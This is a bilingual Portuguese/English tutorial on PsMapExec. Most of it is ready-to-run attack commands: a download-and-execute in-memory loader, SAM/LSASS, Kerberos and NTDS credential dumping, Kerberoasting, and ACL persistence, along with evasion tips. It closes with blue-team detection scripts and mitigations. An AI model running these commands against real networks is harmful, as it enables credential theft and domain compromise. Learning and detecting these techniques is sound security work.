2. Contexto e Relevância / Context and Relevance Original

O PsMapExec foi desenvolvido por The-Viper-One e inspirado no CrackMapExec/NetExec. Não tem funcionalidades idênticas, mas tem furtividade: carrega diretamente em memória sem tocar no disco. Usa a sessão atual para executar comandos, por isso nem sempre precisas de saber a password da vítima. Como a maioria das ferramentas ofensivas públicas, é sinalizado por AV se carregado diretamente — às vezes os hackers reescrevem os scripts mantendo as funções core para contornar o AV. PsMapExec was developed by The-Viper-One and inspired by CrackMapExec/NetExec. It doesn't have identical features, but it has stealth: it loads directly in memory without touching disk. It uses the current session to execute commands, so you don't always need to know the victim's password. Like most publicly available offensive tools, it's flagged by AV if loaded directly — sometimes hackers rewrite scripts keeping core functions to bypass AV.

3. Carregar em Memória / Loading in Memory Original

Para evitar tocar no disco e deixar rastos forenses desnecessários, executa o script diretamente em memória: To avoid touching disk and leaving unnecessary forensic traces, execute the script directly in memory: 
PS > IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/The-Viper-One/PsMapExec/main/PsMapExec.ps1")

4. Dump de SAM Hashes Original

O SAM dá-te hashes de contas locais; o LSASS contém os hashes de todos os utilizadores ligados. Para dump de contas locais de uma máquina: SAM gives you local account hashes; LSASS holds hashes of all connected users. To dump local accounts from a single machine: 
PS > PsMapExec smb -Targets MANAGER-1 -Module SAM -ShowOutput
Para todas as máquinas do domínio: For all machines in the domain: 
PS > PsMapExec smb -Targets all -Module SAM -ShowOutput
O output é limpo e inclui apenas contas locais válidas. Mas lembra-te: quanto menos ruído, melhor. The output is clean and only includes valid local accounts. But remember: the less noise, the better.

5. Dump de LSASS Hashes Original

As credenciais LSASS são armazenadas temporariamente e contêm contas de domínio que precisas de testar. Em algumas organizações, utilizadores críticos pertencem ao Protected Users Group, o que impede que as credenciais sejam cacheadas em memória. LSASS credentials are stored temporarily and hold domain accounts you need to test. In some organizations, critical users belong to the Protected Users Group, which prevents credentials from being cached in memory.

5.1 Local (shell elevada) / Local (elevated shell)

PS > PsMapExec smb -Targets "localhost" -Module "LogonPasswords" -ShowOutput

5.2 Remoto com credenciais / Remote with credentials

PS > PsMapExec smb -Targets "DC" -Username "user" -Password "password" -Module "LogonPasswords" -ShowOutput

6. Execução Remota de Comandos / Remote Command Execution Original

Cada rede é diferente. Algumas empresas segmentam para prevenir movimento lateral — nesse caso precisas de pivot. Um host de pivot tem a interface de rede que precisas ou consegue fazer ping a hosts noutra sub-rede. Every network is different. Some companies segment to prevent lateral movement — in that case you need to pivot. A pivot host has the network interface you need or can ping hosts on another subnet.

6.1 Ver interfaces em todas as máquinas / View interfaces on all machines

PS > PsMapExec SMB -Target all -Username "user" -Password "password" -Command "ipconfig" -Domain "sekvoya.local"

6.2 Máquina única / Single machine

PS > PsMapExec SMB -Target "DC" -Username "user" -Password "password" -Command "ipconfig" -Domain "sekvoya.local"

6.3 Ativar WinRM / Enable WinRM

PS > PsMapExec SMB -Target "MANAGER-1" -Username "user" -Password "password" -Command "winrm quickconfig -q" -Domain "sekvoya.local"
O WinRM é frequentemente usado para movimento lateral. WinRM is often used for lateral movement.

7. Tickets Kerberos (KerbDump) Original

O módulo Kerbdump extrai tickets Kerberos de hosts remotos, que podem ser usados em ataques Pass the Ticket. Alguns domínios desativam NTLM por segurança — é aí que precisas destes tickets. O tráfego Kerberos é normal e frequente em AD, por isso se tiveres escolha entre NTLM e Kerberos, vai de Kerberos. The Kerbdump module extracts Kerberos tickets from remote hosts, which can be used in Pass the Ticket attacks. Some domains disable NTLM for security — that's when you need these tickets. Kerberos traffic is normal and frequent in AD, so if you have a choice between NTLM and Kerberos, go with Kerberos. 
PS > PsMapExec -Method smb -Targets DC -Username "user" -Password "password" -Module "KerbDump" -ShowOutput
O script parseia o output e atribui os tickets a variáveis que podes usar para movimento lateral. The script parses the output and assigns tickets to variables you can use for lateral movement.

8. Kerberoasting Original

Ao contrário do KerbDump, o Kerberoasting não dá tickets reutilizáveis — precisam de ser crackeados para recuperar a password. Ocasionalmente encontras Domain Admins ou contas de serviço com um SPN atribuído; é esse SPN que as torna vulneráveis. O Kerberoasting em si não requer privilégios, por isso podes obter um hash de admin usando apenas um utilizador de domínio de baixo privilégio. Unlike KerbDump, Kerberoasting doesn't give reusable tickets — they need to be cracked to recover the password. Occasionally you find Domain Admins or service accounts with an SPN assigned; that SPN makes them vulnerable. Kerberoasting itself doesn't require privileges, so you can get an admin hash using just a low-privilege domain user.

8.1 Atribuir SPN a um utilizador / Assign SPN to a user

PS > PsMapExec ldap -Targets DC -Module AddSPN -TargetDN "CN=username,DC=SEKVOYA,DC=LOCAL"

8.2 Kerberoast / Kerberoast

PS > PsMapExec kerberoast -Target "DC" -Username "user" -Password "password" -Option "kerberoast:adm_ivanov" -ShowOutput

9. Ekeys Original

Os tickets Kerberos são cifrados com chaves especiais de encriptação; podes extrair essas chaves para desencriptar ou até forjar tickets. Útil para persistência e movimento lateral. Kerberos tickets are encrypted with special encryption keys; you can extract those keys to decrypt or even forge tickets. Useful for persistence and lateral movement. 
PS > PsMapExec wmi -Targets all -Module ekeys -ShowOutput

10. Timeroasting Original

Este ataque explora a forma como as máquinas AD sincronizam relógios via NTP. Os hackers podem obter hashes de contas de computador. As passwords de computador são strings grandes e aleatórias — não são crackáveis, a menos que a password corresponda ao nome do computador (configuração pré-Windows 2000). Com privilégios de Domain Admin, podes transformar um utilizador de domínio em computador de domínio, obter o hash e reverter a alteração — forma muito furtiva de obter hashes crackáveis. This attack exploits how AD machines sync clocks via NTP. Hackers can get hashes for computer accounts. Computer passwords are big random strings — not crackable, unless the password matches the computer name (pre-Windows 2000 config). With Domain Admin privileges, you can turn a domain user into a domain computer, get the hash, and revert the change — a very stealthy way to get crackable hashes. 
PS > PsMapExec ldap -Targets DC -Module timeroast -ShowOutput

11. Files — Encontrar Credenciais em Texto / Find Plaintext Credentials Original

Alguns utilizadores guardam credenciais em ficheiros de texto no Desktop. O módulo Files encontra ficheiros não-padrão nos diretórios dos utilizadores. Some users store credentials in text files on their Desktop. The Files module finds non-default files within user directories. 
PS > PsMapExec wmi -Targets all -Module Files -ShowOutput

12. ACL Persistence Original

Os hackers cometem erros e os defensores tomam medidas para os expulsar. Uma vez mudadas as credenciais, não há muito a fazer — a menos que tenhas persistência via ACL. O privilégio DCSync é um dos mais comuns: o teu computador impersona um DC e pede hashes de password. Outro comum é GenericAll sobre o AdminSDHolder, que te permite adicionar membros a Domain Admins e mudar as passwords dos seus membros. Hackers make mistakes and defenders take measures to evict them. Once credentials change, there's not much you can do — unless you have ACL persistence. DCSync privilege is one of the most common: your computer impersonates a DC and requests password hashes. Another common one is GenericAll over AdminSDHolder, letting you add members to Domain Admins and change their passwords. 
PS > PsMapExec ldap -Target DC -Module Elevate -TargetDN "CN=username,DC=SEKVOYA,DC=LOCAL"

13. NTDS Dump Original

O dump do NTDS é o estágio final, uma vez obtidos privilégios de Domain Admin. O PsMapExec obtém o NTDS.dit e extrai todos os hashes NTLM. O NTDS tem todas as contas que existiram no domínio. The NTDS dump is the final stage once Domain Admin privileges are obtained. PsMapExec gets the NTDS.dit and extracts all NTLM hashes. NTDS has all accounts that ever existed in the domain. 
PS > PsMapExec SMB -Targets "DC" -Username "user" -Password "password" -Module NTDS -ShowOutput

15. Scripts de Impacto / Impact Scripts Impacto Complementar

Os scripts abaixo ajudam o blue team a detetar atividade compatível com PsMapExec, com output legível e exportação para relatório. The scripts below help the blue team detect activity consistent with PsMapExec, with readable output and report export.

15.1 Script 9.1 — Deteção de Carregamento em Memória / In-Memory Loading Detection

Objetivo: detetar IEX(New-Object Net.WebClient).DownloadString e strings relacionadas com PsMapExec em Script Block Logging (4104). Evidência: psmapexec-load.csv. Goal: detect IEX(New-Object Net.WebClient).DownloadString and PsMapExec-related strings in Script Block Logging (4104). Evidence: psmapexec-load.csv. 
# Script 9.1 - In-Memory Loading Detection
$out = ".\psmapexec-load.csv"
$patterns = @("PsMapExec","DownloadString.*PsMapExec","IEX.*PsMapExec")
$hits = @()
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 2000 -EA SilentlyContinue |
  Where-Object { $_.Id -eq 4104 } | ForEach-Object {
    $msg = $_.Message
    foreach ($p in $patterns) { if ($msg -match $p) { $hits += [PSCustomObject]@{ Time=$_.TimeCreated; Pattern=$p; Snippet=$msg.Substring(0,[Math]::Min(300,$msg.Length)) } } }
  }
$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
Write-Host "[+] Hits: $($hits.Count) -> $out" -ForegroundColor Red

15.2 Script 9.2 — Deteção de Dump SAM/LSASS / SAM/LSASS Dump Detection

Objetivo: detetar acesso suspeito a SAM/LSASS via Sysmon (Event 10) e processos como rundll32 ou powershell a aceder a lsass.exe. Evidência: lsass-access.csv. Goal: detect suspicious SAM/LSASS access via Sysmon (Event 10) and processes like rundll32 or powershell accessing lsass.exe. Evidence: lsass-access.csv. 
# Script 9.2 - LSASS Access Detection (Sysmon required)
$out = ".\lsass-access.csv"
$hits = @()
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 2000 -EA SilentlyContinue |
  Where-Object { $_.Id -eq 10 } | ForEach-Object {
    $xml = [xml]$_.ToXml()
    $target = ($xml.Event.EventData.Data | Where-Object Name -eq "TargetImage").'#text'
    $source = ($xml.Event.EventData.Data | Where-Object Name -eq "SourceImage").'#text'
    if ($target -match "lsass\.exe" -and $source -notmatch "MsMpEng|svchost") {
      $hits += [PSCustomObject]@{ Time=$_.TimeCreated; Source=$source; Target=$target }
    }
  }
$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
Write-Host "[+] LSASS access hits: $($hits.Count) -> $out" -ForegroundColor Red

15.3 Script 9.3 — Deteção de Timeroasting/SPN / Timeroasting/SPN Detection

Objetivo: detetar criação suspeita de SPN e alterações a userAccountControl em contas de utilizador (indicadores de Timeroasting/AddSPN). Evidência: spn-changes.csv. Goal: detect suspicious SPN creation and userAccountControl changes on user accounts (Timeroasting/AddSPN indicators). Evidence: spn-changes.csv. 
# Script 9.3 - SPN/Timeroasting Detection (requires AD module)
Import-Module ActiveDirectory -EA Stop
$out = ".\spn-changes.csv"
$hits = @()
Get-ADUser -Filter * -Properties servicePrincipalName,userAccountControl,whenChanged |
  Where-Object { $_.servicePrincipalName -and $_.whenChanged -gt (Get-Date).AddDays(-7) } |
  ForEach-Object {
    $hits += [PSCustomObject]@{ User=$_.SamAccountName; SPN=($_.servicePrincipalName -join ";"); UAC=$_.userAccountControl; Changed=$_.whenChanged }
  }
$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
Write-Host "[+] Recent SPN changes: $($hits.Count) -> $out" -ForegroundColor Yellow

17. Mitigações Blue Team / Mitigations Complementar

  1. Protected Users Group — impede cache de credenciais em LSASS.
  2. Credential Guard — protege LSASS contra dump.
  3. Script Block Logging (4104) + AMSI — deteta IEX + DownloadString com PsMapExec.
  4. Sysmon Event 10 — monitoriza acesso a lsass.exe.
  5. Desativar NTLM onde possível — força Kerberos, mas Kerberoasting continua a ser risco.
  6. Monitorizar alterações a servicePrincipalName e userAccountControl — deteta AddSPN/Timeroasting.
  7. Auditar ACLs — DCSync e GenericAll sobre AdminSDHolder são críticos.
  8. Reduzir MAQ para 0 — remove vetor de criação de computadores.
  9. Monitorizar execução remota — SMB, WinRM, WMI em hosts não esperados.
  10. Honeytokens — ficheiros Files falsos com credenciais isca.
